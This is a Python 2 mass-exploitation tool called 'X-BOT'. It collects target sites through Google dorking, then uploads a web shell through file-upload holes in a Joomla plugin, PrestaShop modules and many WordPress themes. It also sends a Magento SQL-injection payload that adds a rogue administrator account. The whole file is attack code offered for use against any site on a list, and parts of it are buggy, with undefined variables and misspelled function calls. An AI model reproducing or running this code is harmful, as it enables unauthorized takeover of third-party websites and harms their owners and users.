import requests, re, os, base64;
from urlparse import urlparse, parse_qs

def com_fabrik(shell, list):
	wordlist = open(list,'r')
	for site in wordlist.readlines():
		site.strip()
		gg = urlparse(site).netloc
		print("[+] Trying Exploit")
		print(" | "+gg)
		target = "http://"+gg+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
		postdata = files={'file':(shell, open(shell,'rb'),'multipart/form-data')}
		try:
			g = requests.post(target, postdata)
			cek = requests.get(target+"/"+shell)
			if cek.status_code == "200":
				print(" | Status : Success Exploit")
				print(" | Shell Path : /"+shell)
			else:
				print(" | Status : Failed Exploit")
				print(" | Path Shell : Null Value")
		except:
			pass

def prestashop(shell, exp, list):
	wordlist = open(list,"r")
	for site in wordlist.readlines():
		site.strip()
		gg = urlparse(site).netloc
		print("[+] Trying Exploit")
		print(" | "+gg)
		target = "http://"+gg+"/modules/"+exp+"/uploadimage.php"
		postdata = files={'userfile':(shell, open(shell,'rb'),'multipart/form-data')}
		try:
			g = requests.post(target, postdata)
			cek = "http://"+gg+"/modules/"+themes+"/slides/"+shell
			cek = requests.get(cek).status_code
			if cek == 200:
				print(" | Status: Success Exploit")
				print(" | Shell Path : /wp-content/themes/"+themes+"/theme/function/slides/"+shell)
			else:
				print(" | Status : Failed Exploit")
				print(" | Path Shell : Null Value")
		except:
			pass
				

def fileuploadscrf(shell, themes, list):
	wordlist = open(list,"r")
	for site in wordlist.readlines():
		site = site.strip()
		gg = urlparse(site).netloc
		print("[+] Trying Exploit")
		print(" | http://"+gg)
		target = "http://"+gg+"/wp-content/themes/"+themes+"/theme/function/upload.php"
		file = {'uploadfile':shell}
		try:
			g = requests.post(target, files=file).text
			cek = requests.get("http://"+gg+"/wp-content/themes/"+themes+"/theme/function/"+g).status_code
			if cek == "200":
				print(" | Status : Success Exploit")
				print(" | Path Shell : /wp-content/themes/"+themes+"/theme/function/"+g)
			else:
				print(" | Status : Failed Exploit")
				print(" | Path Shell : Null Value")
		except:
			pass
			
def magento(user, pwdx, list):
	wordlist = open(list, "r")
	for site in wordlist.readlines():
		site = site.strip()
		gg = urlparse(site).netloc
		print("[+] Trying Exploit")
		print(" | http://"+gg)
		target_url = "http://"+gg+"/admin/Cms_Wysiwyg/directive/index/"
		q="""
			SET @SALT = 'rp';
			SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
		query = q.replace("\n", "").format(username=user, password=pwdx)
		pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
		# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
		r = requests.post(target_url,
				data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
				"filter": base64.b64encode(pfilter),
				"forwarded": 1})
		if r.ok:
			print(" | Status : Success Exploit")
			print("| Login : http://"+gg+"/index.php/admin")
			print(" | User : "+user)
			print(" | Pass : "+pwdx)
		else:
			print(" | Status : Failed Exploit")


def scan(dork, tld, log):
	url = []
	result = open(log,"a")
	page = 0
	print("[+] Scanned Running By Dork : "+dork)
	while page <= 100:
		urll = "http://www.google."+tld+"/search?q="+dork+"&start="+str(page)+"&inurl=https"
		htmll = requests.get(urll).text
		if re.findall('<script src="(.*?)" async defer></script>', htmll):
			print("[-] Captcha Detect! You're Requests Blocked")
			print("[-[ Pleae Trun Off You're Connection For Change New IP Addres")
			pass
		else:
			pass
		link = re.findall(r'<h3 class="r"><a href="(.*?)"',htmll)
		for i in link:
			i=i.strip()
			o = urlparse(i, 'http')
			if i.startswith('/url?'):
				link = parse_qs(o.query)['q'][0]
				url.append(link)
				result.write(str(link+"\n"))
		page+=10
		print("["+str(len(url))+"]  Site Crawled")
	print("["+str(len(url))+"] Success Crawled All")

print("[*] Welcome To X-BOT's Dorker And Auto Exploit\n[*] AndroSec1337 Cyber Team\n\n")
print("""[X-BOT] List Tools :

	[1] Google Dorker
	[2] Magento Add Admin
	[3] Wordpress Themes Kindness
	[4] Wordpress Themes Oakland
	[5] Wordpress Themes Brilliant
	[6] Wordpress Themes Echolake
	[7] Wordpreas Themes Emcwil
	[8] Wordpreas Themes Trymee
	[9] Wordpreas Themes Shepard
	[10] Wordpreas Themes Pacifico
	[11] Wordpreas Themes Willbridge
	[12] Wordpreas Themes Qreator
	[13] Wordpreas Themes Clockstone
	[14] Wordpreas Themes Expresso
	[15] Wordpreas Themes Cleanple
	[16] Wordpreas Themes Eac
	[17] Prestashop Simple Sllide Show
	[18] Prestashop Product Page Adverts
	[19] Joomla Com_Fabrik""")
tools = raw_input("\n[X-BOT] Select Tools >>> ")
if tools == "1":
	dork = raw_input("[X-BOT] Input Dork : ")
	if ' ' in dork:
		dork = dork.replace(' ', '+')
	else:
		pass
	dom = "com"
	out = raw_input("[X-BOT] Input Output Dorking : ")
	scan(dork,dom,out)
if tools == "2":
	user = raw_input("[X-BOT] Input User : ")
	pwd = raw_input("[X-BOT] Input Pass : ")
	list = raw_input("[X-BOT] Input List Target : ")
	magento(user, pwd, list)
elif tools == "3":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "kindness"
	fileuploadscrf(shell, tema,list)
elif tools == "4":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "oakland"
	fileuploadscrf(shell, tema,list)
elif tools == "5":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "brilliant"
	fileuploadscrf(shell, tema,list)
elif tools == "6":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "echolake"
	fileuploadscrf(shell, tema, list)
elif tools == "7":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "emcwil"
	fileuploadscrf(shell, tema, list)
elif tools == "8":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "trymee"
	fileuploadscrf(shell, tema, list)
elif tools == "9":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "shepard"
	fileuploadscrf(shell, tema, list)
elif tools == "10":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "pacifico"
	fileuploadscrf(shell, tema, list)
elif tools == "11":
	shell = raw_input("[X-BOT] Input Shell : ")
	tema = "willbridge"
	fileuploadscrf(shell, tema,list)
elif tools == "12":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "qreator"
	fileuploadscrf(shell, tema,list)
elif tools == "13":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "clockstone"
	fileuploadcsrf(shell, tema,list)
elif tools == "14":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "expresso"
	fileuploadcsrf(shell, tema, list)
elif tools == "15":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "cleanple"
	fileuploadscrf(shell, tema, list)
elif tools == "16":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "eac"
	fileuploadscrf(shell, tema, list)
elif tools == "17":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "simpleslideshow"
	prestashop(shell, tema, list)
elif tools == "18":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	tema = "productpageadverts"
	prestashop(shell, tema, list)
elif tools == "19":
	shell = raw_input("[X-BOT] Input Shell : ")
	list = raw_input("[X-BOT] Input List Target : ")
	com_fabrik(shell, list)
else:
	print("[X] X-BOT Num "+tools+" Not Found")
	exit()